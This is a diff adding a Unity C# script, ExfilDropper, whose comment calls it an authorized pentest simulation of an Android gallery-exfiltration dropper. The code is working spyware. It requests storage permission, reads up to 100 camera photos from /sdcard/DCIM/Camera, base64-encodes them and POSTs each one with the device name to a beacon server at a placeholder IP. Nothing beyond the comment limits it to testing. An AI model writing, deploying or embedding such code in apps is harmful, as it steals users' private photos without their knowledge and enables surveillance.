@@ -1,0 +1,58 @@
+using UnityEngine;
+using UnityEngine.Networking;
+using System.Collections;
+using System.IO;
+using System;
+
+/*
+ * AUTHORIZED PENTEST SIMULATION: DROPPED PAYLOAD SNIPPET
+ * This script simulates an Android gallery exfiltration dropper.
+ * Use for vulnerability assessment and remediation testing only.
+ */
+public class ExfilDropper : MonoBehaviour
+{
+    private string beaconUrl = "http://192.168.1.XX:80/api/beacon"; // Localhost of MyNet app
+
+    void Start()
+    {
+        // 1. Request Gallery Permissions (Android-Specific)
+        #if UNITY_ANDROID
+        if (!UnityEngine.Android.Permission.HasUserAuthorizedPermission(UnityEngine.Android.Permission.ExternalStorageRead))
+        {
+            UnityEngine.Android.Permission.RequestUserPermission(UnityEngine.Android.Permission.ExternalStorageRead);
+        }
+        #endif
+
+        StartCoroutine(ExfiltrateData());
+    }
+
+    IEnumerator ExfiltrateData()
+    {
+        // 2. Identify Gallery Path
+        string path = "/sdcard/DCIM/Camera";
+        if (!Directory.Exists(path)) yield break;
+
+        // 3. Grab last 100 images
+        var files = Directory.GetFiles(path, "*.jpg");
+        int count = Math.Min(files.Length, 100);
+
+        for (int i = 0; i < count; i++)
+        {
+            byte[] bytes = File.ReadAllBytes(files[i]);
+            string base64 = Convert.ToBase64String(bytes);
+
+            // 4. Beacon back to local server
+            WWWForm form = new WWWForm();
+            form.AddField("device", SystemInfo.deviceName);
+            form.AddField("file", Path.GetFileName(files[i]));
+            form.AddField("data", base64);
+
+            using (UnityWebRequest www = UnityWebRequest.Post(beaconUrl, form))
+            {
+                yield return www.SendWebRequest();
+                if (www.result == UnityWebRequest.Result.Success)
+                    Debug.Log("Beacon successful: " + files[i]);
+            }
+        }
+    }
+}
